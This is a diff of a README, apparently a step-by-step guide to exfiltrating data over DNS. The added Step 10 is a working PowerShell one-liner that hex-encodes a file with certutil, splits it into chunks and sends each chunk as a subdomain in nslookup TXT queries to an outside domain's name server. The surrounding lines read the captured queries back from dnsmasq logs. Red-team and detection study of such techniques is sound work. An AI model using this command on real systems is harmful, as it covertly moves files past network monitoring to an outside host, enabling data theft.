@@ -78,9 +78,9 @@ sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/ff2684c5-136f-4ab2-8da7-88c17f0aa1a2)
 
 
-## Step 10: Create a BATCH file to certutil hex a file, split it, then nslookup
+## Step 10: Powershell command to hex encode a file, split, and do nslookup IMPROVEMENT POINT TO REMOVE encoded.hex
 
-
+certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5}  
 
 ## Step 11: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 
